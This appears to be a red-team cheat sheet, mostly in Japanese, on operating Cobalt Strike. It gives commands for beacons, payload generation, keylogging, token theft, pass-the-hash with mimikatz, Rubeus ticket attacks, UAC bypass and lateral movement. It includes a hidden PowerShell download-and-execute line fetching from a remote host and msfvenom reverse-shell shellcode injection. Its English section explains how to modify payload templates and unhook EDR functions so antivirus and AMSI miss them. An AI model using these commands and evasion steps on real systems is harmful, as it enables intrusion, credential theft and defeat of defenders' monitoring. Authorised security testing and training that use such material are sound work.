# Cobalt Strike

### リスナー

### C2 リスナー

`Cobalt Strike -> Listeners -> Add/Edit` その後、リスンする場所、使用するビークンの種類（http、dns、smb...）などを選択できます。

### Peer2Peer リスナー

これらのリスナーのビークンは、C2と直接通信する必要はなく、他のビークンを通じて通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` その後、TCPまたはSMBビークンを選択する必要があります。

* **TCPビークンは選択したポートにリスナーを設定します**。TCPビークンに接続するには、別のビークンから `connect <ip> <port>` コマンドを使用します。
* **smbビークンは選択した名前のパイプ名でリスンします**。SMBビークンに接続するには、`link [target] [pipe]` コマンドを使用する必要があります。

### ペイロードの生成とホスティング

#### ファイル内でのペイロードの生成

`Attacks -> Packages ->`

* **`HTMLApplication`** HTAファイル用
* **`MS Office Macro`** マクロ付きのオフィス文書用
* **`Windows Executable`** .exe、.dll、またはサービス .exe 用
* **`Windows Executable (S)`** **ステージレス** .exe、.dll、またはサービス .exe 用（ステージレスの方がステージ付きよりも良い、IoCsが少ない）

#### ペイロードの生成とホスティング

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これにより、Cobalt Strikeからビークンをダウンロードするためのスクリプト/実行可能ファイルが生成されます。形式は bitsadmin、exe、powershell、python などです。

#### ペイロードのホスティング

ホスティングしたいファイルがすでにある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルとウェブサーバーの設定を選択します。

### ビークンオプション

<pre class="language-bash"><code class="lang-bash"># ローカル .NET バイナリを実行
execute-assembly </path/to/executable.exe>
# 1MBを超えるアセンブリをロードするには、malleable profileの'tasks_max_size'プロパティを変更する必要があります。

# スクリーンショット
printscreen    # PrintScrメソッドを使用して単一のスクリーンショットを撮る
screenshot     # 単一のスクリーンショットを撮る
screenwatch    # デスクトップの定期的なスクリーンショットを撮る
## 表示 -> スクリーンショットに移動して確認する

# キーロガー
keylogger [pid] [x86|x64]
## 表示 > キーストロークで押されたキーを確認する

# ポートスキャン
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内にポートスキャンアクションを注入
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Powershellモジュールをインポート
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <ここにpowershellコマンドを書く> # これはサポートされている最高のpowershellバージョンを使用します（oppsecではない）
powerpick <cmdlet> <args> # これはspawntoで指定された犠牲プロセスを作成し、より良いopsecのためにUnmanagedPowerShellを注入します（ログなし）
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # これは指定されたプロセスにUnmanagedPowerShellを注入してPowerShellコマンドレットを実行します。

# ユーザーの偽装
## クレデンシャルを使用したトークン生成
make_token [DOMAIN\user] [password] # ネットワーク内のユーザーを偽装するためのトークンを作成
ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
rev2self # make_tokenで生成されたトークンの使用を停止
## make_tokenの使用はイベント4624を生成します: アカウントが正常にログオンしました。このイベントはWindowsドメインで非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。上記のように、これはLOGON32_LOGON_NEW_CREDENTIALSを使用します（タイプ9）。

# UACバイパス
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pidからトークンを盗む
## make_tokenのようですが、プロセスからトークンを盗む
steal_token [pid] # これはネットワークアクションに便利で、ローカルアクションには便利ではありません
## APIドキュメントから、これは「呼び出し元が現在のトークンをクローンすることを許可する」ログオンタイプであることがわかります。これがビークン出力に「Impersonated <current_username>」と表示される理由です - 自分のクローンされたトークンを偽装しています。
ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
rev2self # steal_tokenからのトークンの使用を停止

## 新しいクレデンシャルでプロセスを起動
spawnas [domain\username] [password] [listener] # 読み取りアクセスのあるディレクトリから実行する: cd C:\
## make_tokenのように、これはWindowsイベント4624を生成します: アカウントが正常にログオンしましたが、ログオンタイプは2（LOGON32_LOGON_INTERACTIVE）です。呼び出しユーザー（TargetUserName）と偽装されたユーザー（TargetOutboundUserName）が詳細に記載されます。

## プロセスに注入
inject [pid] [x64|x86] [listener]
## OpSecの観点から: 本当に必要でない限り、クロスプラットフォームの注入は行わないでください（例: x86 -> x64 または x64 -> x86）。

## ハッシュを渡す
## この修正プロセスはLSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light (PPL)が有効な場合はあまり実行可能ではありません。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## mimikatzを介してハッシュを渡す
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## /runなしで、mimikatzはcmd.exeを生成します。デスクトップを持つユーザーとして実行している場合、シェルが表示されます（SYSTEMとして実行している場合は問題ありません）
steal_token <pid> #mimikatzによって作成されたプロセスからトークンを盗む

## チケットを渡す
## チケットをリクエスト
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## 新しいチケットを使用するための新しいログオンセッションを作成します（侵害されたものを上書きしないため）
make_token <domain>\<username> DummyPass
## PowerShellセッションから攻撃者のマシンにチケットを書き込み、ロードします
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEMからチケットを渡す
## チケットを持つ新しいプロセスを生成
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## そのプロセスからトークンを盗む
steal_token <pid>

## チケットを抽出 + チケットを渡す
### チケットのリスト
execute-assembly C:\path\Rubeus.exe triage
### luidによる興味深いチケットをダンプ
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### 新しいログオンセッションを作成し、luidとprocessidを記録
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 生成されたログオンセッションにチケットを挿入
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最後に、その新しいプロセスからトークンを盗む
steal_token <pid>

# 横移動
## トークンが作成されている場合は使用されます
jump [method] [target] [listener]
## メソッド:
## psexec                    x86   サービスを使用してサービスEXEアーティファクトを実行
## psexec64                  x64   サービスを使用してサービスEXEアーティファクトを実行
## psexec_psh                x86   サービスを使用してPowerShellワンライナーを実行
## winrm                     x86   WinRM経由でPowerShellスクリプトを実行
## winrm64                   x64   WinRM経由でPowerShellスクリプトを実行
## wmi_msbuild               x64   msbuildインラインC#タスクを使用したwmi横移動（oppsec）

remote-exec [method] [target] [command] # remote-execは出力を返しません
## メソッド:
## psexec                          サービスコントロールマネージャー経由でリモート実行
## winrm                           WinRM（PowerShell）経由でリモート実行
## wmi                             WMI経由でリモート実行

## wmiを使用してビークンを実行するには（jumpコマンドには含まれていません）、ビークンをアップロードして実行します
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Metasploitへのセッションの渡し - リスナーを介して
## Metasploitホスト上で
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt上で: Listeners > Addを選択し、PayloadをForeign HTTPに設定します。Hostを10.10.5.120、Portを8080に設定し、保存をクリックします。
beacon> spawn metasploit
## 外部リスナーを使用してx86 Meterpreterセッションのみを生成できます。

# Metasploitへのセッションの渡し - シェルコード注入を介して
## Metasploitホスト上で
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## msfvenomを実行し、multi/handlerリスナーを準備します。

## binファイルをCobalt Strikeホストにコピー
ps
shinject <pid> x64 C:\Payloads\msf.bin #x64プロセスにMetasploitシェルコードを注入

# MetasploitセッションをCobalt Strikeに渡す
## ステージレスビークンシェルコードを生成し、Attacks > Packages > Windows Executable (S)に移動し、希望のリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用します。
## Metasploitでpost/windows/manage/shellcode_injectを使用して生成されたCobalt Strikeシェルコードを注入します。

# ピボッティング
## チームサーバーでソックスプロキシを開く
beacon> socks 1080

# SSH接続
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** は、リモートプロセス注入を使用して指定されたプログラムを実行するために**犠牲プロセス**を使用します。これは非常に騒がしく、プロセス内に注入するために特定のWin APIが使用され、すべてのEDRがチェックしています。しかし、同じプロセスに何かをロードするために使用できるカスタムツールもいくつかあります：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strikeでは、BOF（Beacon Object Files）も使用できます: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

アグレッサースクリプト `https://github.com/outflanknl/HelpColor` は、Cobalt Strikeに `helpx` コマンドを作成し、コマンドに色を付けてBOFs（緑）、Frok&Run（黄色）などを示し、プロセス実行、注入、またはそれに類似するもの（赤）を示します。これにより、どのコマンドがよりステルスであるかを知るのに役立ちます。

### ユーザーとして行動する

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のようなイベントを確認できます：

- セキュリティEID 4624 - 通常の操作時間を知るためにすべてのインタラクティブログオンを確認します。
- システムEID 12,13 - シャットダウン/起動/スリープの頻度を確認します。
- セキュリティEID 4624/4625 - 有効/無効なNTLM試行を確認します。
- セキュリティEID 4648 - プレーンテキストのクレデンシャルがログオンに使用されたときにこのイベントが生成されます。プロセスが生成した場合、バイナリは構成ファイルまたはコード内にクリアテキストのクレデンシャルを持っている可能性があります。

Cobalt Strikeから `jump` を使用する場合、新しいプロセスをより正当なものに見せるために `wmi_msbuild` メソッドを使用する方が良いです。

### コンピュータアカウントを使用する

防御者がユーザーから生成された奇妙な動作をチェックしていることが一般的であり、**サービスアカウントやコンピュータアカウント（`*$`など）を監視から除外する**ことがよくあります。これらのアカウントを使用して横移動や特権昇格を行うことができます。

### ステージレスペイロードを使用する

ステージレスペイロードは、C2サーバーからの第二段階をダウンロードする必要がないため、ステージ付きのものよりも騒がしくありません。これは、初期接続後にネットワークトラフィックを生成しないため、ネットワークベースの防御によって検出される可能性が低くなります。

### トークンとトークンストア

トークンを盗むまたは生成する際には注意が必要です。EDRがすべてのスレッドのトークンを列挙し、**異なるユーザー**またはプロセス内のSYSTEMに属するトークンを見つける可能性があるためです。

これにより、**ビークンごとにトークンを保存**できるため、同じトークンを何度も盗む必要がなくなります。これは横移動や盗まれたトークンを複数回使用する必要がある場合に便利です：

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

横移動する際には、通常は**新しいトークンを生成するよりもトークンを盗む方が良い**です。

### ガードレール

Cobalt Strikeには、**ガードレール**と呼ばれる機能があり、防御者によって検出される可能性のある特定のコマンドやアクションの使用を防ぐのに役立ちます。ガードレールは、`make_token`、`jump`、`remote-exec`など、横移動や特権昇格に一般的に使用される特定のコマンドをブロックするように構成できます。

さらに、リポジトリ [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) には、ペイロードを実行する前に考慮すべきいくつかのチェックやアイデアも含まれています。

### チケットの暗号化

ADでは、チケットの暗号化に注意してください。デフォルトでは、一部のツールはKerberosチケットにRC4暗号化を使用しますが、これはAES暗号化よりも安全性が低く、デフォルトで最新の環境ではAESが使用されます。これは、弱い暗号化アルゴリズムを監視している防御者によって検出される可能性があります。

### デフォルトを避ける

Cobalt Strikeを使用する際、デフォルトではSMBパイプの名前は `msagent_####` および `"status_####` になります。これらの名前を変更してください。Cobalt Strikeから既存のパイプの名前を確認するには、コマンド: `ls \\.\pipe\` を使用します。

さらに、SSHセッションでは `\\.\pipe\postex_ssh_####` というパイプが作成されます。これを `set ssh_pipename "<new_name>";` で変更します。

また、ポストエクスプロイト攻撃では、パイプ `\\.\pipe\postex_####` を `set pipename "<new_name>"` で変更できます。

Cobalt Strikeプロファイルでは、次のようなことも変更できます：

- `rwx` の使用を避ける
- `process-inject {...}` ブロック内でプロセス注入の動作がどのように機能するか（どのAPIが使用されるか）
- `post-ex {…}` ブロック内での「フォークと実行」の動作
- スリープ時間
- メモリにロードされるバイナリの最大サイズ
- メモリフットプリントとDLLコンテンツを `stage {...}` ブロックで
- ネットワークトラフィック

### メモリスキャンのバイパス

一部のEDRは、既知のマルウェアシグネチャのためにメモリをスキャンします。Cobalt Strikeは、バックドアをメモリ内で暗号化できる `sleep_mask` 関数をBOFとして変更することを許可します。

### 騒がしいプロセス注入

プロセスにコードを注入する際、通常は非常に騒がしいです。これは、**通常のプロセスがこのアクションを実行しないため、またこの方法が非常に限られているため**です。したがって、行動ベースの検出システムによって検出される可能性があります。さらに、EDRがネットワークをスキャンして**ディスクに存在しないコードを含むスレッド**を探している場合にも検出される可能性があります（ただし、ブラウザなどのプロセスはJITを使用していることが一般的です）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PIDとPPIDの関係

新しいプロセスを生成する際には、検出を避けるために**通常の親子関係**を維持することが重要です。svchost.execがiexplorer.exeを実行している場合、これは疑わしく見えます。なぜなら、svchost.exeは通常のWindows環境ではiexplorer.exeの親ではないからです。

Cobalt Strikeで新しいビークンが生成されると、デフォルトで**`rundll32.exe`**を使用するプロセスが作成され、新しいリスナーを実行します。これはあまりステルスではなく、EDRによって簡単に検出される可能性があります。さらに、`rundll32.exe`は引数なしで実行され、さらに疑わしくなります。

次のCobalt Strikeコマンドを使用すると、新しいビークンを生成するために異なるプロセスを指定でき、検出されにくくなります：
```bash
spawnto x86 svchost.exe
```
あなたはプロファイル内で **`spawnto_x86` と `spawnto_x64`** の設定を変更することもできます。

### 攻撃者のトラフィックをプロキシする

攻撃者は時々、ツールをローカルで実行する必要があり、Linuxマシンでも、被害者のトラフィックをツールに到達させる必要があります（例：NTLMリレー）。

さらに、パス・ザ・ハッシュやパス・ザ・チケット攻撃を行う際、攻撃者が**自分のLSASSプロセスにこのハッシュやチケットを追加する**方が、被害者のマシンのLSASSプロセスを変更するよりもステルス性が高いことがあります。

しかし、**生成されるトラフィックに注意する必要があります**。バックドアプロセスから珍しいトラフィック（Kerberos？）を送信している可能性があるためです。このため、ブラウザプロセスにピボットすることができます（ただし、プロセスに自分を注入して捕まる可能性があるため、ステルスな方法を考えてください）。
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> パスワードを変更  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Change powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# $var_code を $polop に変更  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
